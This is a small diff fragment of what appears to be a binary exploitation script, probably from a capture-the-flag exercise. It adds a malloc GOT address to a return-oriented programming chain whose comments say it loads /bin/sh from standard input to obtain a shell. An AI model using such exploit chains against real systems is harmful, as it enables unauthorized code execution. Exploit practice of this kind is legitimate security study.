@@ -21,6 +21,9 @@ get_input = 0x400794
 pop_ret   = 0x400885
 
 #
+malloc_got = 0x602030
+
+#
 flat(
     get_input,  # Load /bin/sh from STDIN
     pop_ret,    # Return address
